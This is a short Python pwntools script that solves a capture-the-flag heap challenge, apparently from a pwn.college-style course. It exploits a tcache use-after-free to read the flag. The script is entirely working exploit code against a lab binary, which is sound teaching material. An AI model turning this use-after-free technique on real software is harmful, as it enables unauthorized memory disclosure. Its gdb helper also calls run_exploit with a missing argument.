#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '3.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main''')
    run_exploit(p)

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
        
    # malloc two chunks with the size of the allocation made by read_flag
    print(p.recvrepeat(1).decode())
    p.sendline('malloc 0 204')
    print(p.recvrepeat(1).decode())
    p.sendline('malloc 1 204')

    # free the chunks to get them on tcache
    print(p.recvrepeat(1).decode())
    p.sendline('free 0')
    print(p.recvrepeat(1).decode())
    p.sendline('free 1')

    # read_flag will get the two previously freed chunks and put the flag on the first
    print(p.recvrepeat(1).decode())
    p.sendline('read_flag')
    print(p.recvrepeat(1).decode())

    # we still can access the pointer for the first allocation and can print the flag now
    p.sendline('puts 0')
    print(p.recvrepeat(1).decode())

    p.sendline('quit')
    print(p.recvrepeat(1).decode())

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
